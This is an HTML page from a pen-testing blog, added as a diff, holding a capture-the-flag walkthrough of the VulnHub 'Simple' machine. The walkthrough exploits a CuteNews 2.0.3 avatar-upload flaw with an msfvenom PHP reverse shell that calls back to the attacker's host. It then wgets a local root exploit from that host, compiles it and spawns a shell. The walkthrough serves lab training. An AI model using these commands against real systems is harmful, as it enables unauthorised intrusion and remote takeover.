@@ -1,0 +1,278 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>SecTalks: BNE0x03 - Simple  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="May the LORD, my rock, be praised, who trains my hands for battle and my fingers for warfare. &mdash;- Psalm 144:1 From Vulhub Simple CTF is a &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">SecTalks: BNE0x03 - Simple</h2>
+	<div class="entry-content"><p><em>May the LORD, my rock, be praised, who trains my hands for battle and my fingers for warfare.</em> &mdash;- Psalm 144:1</p>
+
+<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/">Vulhub</a></p>
+
+<p>Simple CTF is a boot2root that focuses on the basics of web based hacking. Once you load the VM, treat it as a machine you can see on the network, i.e. you don&rsquo;t have physical access to this machine. Therefore, tricks like editing the VM&rsquo;s BIOS or Grub configuration are not allowed. Only remote attacks are permitted. /root/flag.txt is your ultimate goal.</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Metasploit</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
+<li>Search the web app vulnerability  &mdash; searchsploit</li>
+<li>Generate and upload webshell  &mdash;metasploit</li>
+<li>Get root</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.172 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.172 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 80 is opening. Lets use Iceweasel to view the page.</p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I noticed that the web app is Cutenews 2.0.3. search the exploit:</p>
+
+<p><code>searchsploit cutenews</code></p>
+
+<p>find the interesting results:</p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The exploit is as follow:</p>
+
+<ul>
+<li>Sign up for New User</li>
+<li>Log In</li>
+<li>Go to Personal options <a href="http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal">http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal</a></li>
+<li>Select Upload Avatar Example: Evil.jpg</li>
+<li>use tamper data  &amp; Rename File Evil.jpg to Evil.php</li>
+</ul>
+
+
+<p>Okay, firstly, I creat a reverse php shell,</p>
+
+<p><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.79.156 LPORT=1234 -a php --platform php -o evil.jpg</code></p>
+
+<p>Now, use Burp as proxy, go to Personal options <a href="http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal">http://192.168.79.172/cutenews/index.php?mod=main&amp;opt=personal</a> to upload evil.jpg</p>
+
+<p>in the burp, change the evil.jgp to evil.php</p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>After that, Burp will recevied a GET request:</p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>set metasploit multi/handler.</p>
+
+<p>now go to <a href="http://192.168.79.172/uploads/avatar_bob1bob2.php">http://192.168.79.172/uploads/avatar_bob1bob2.php</a> will get meterpreter reverse shell:</p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>However, I am not the root, search the os version:</p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>search the ubuntu 14.04</p>
+
+<p><code>searchsploit ubuntu 14.04</code> and we get the result:</p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Move the file to /var/www/html/ and in reverse shell:</p>
+
+<p><code>wget http://192.168.79.156/37292.c -O hack.c</code></p>
+
+<p>compile it:</p>
+
+<p><code>gcc hack.c -o hack -static</code>, run it.</p>
+
+<p>then use <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> to get the shell.</p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/simple_ctf1/last.jpg" title="[title manually exploit [alt text]]" ></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-04-20T13:49:22-05:00" pubdate data-updated="true">2016-04-20 13:49:22 -0500</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2016
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
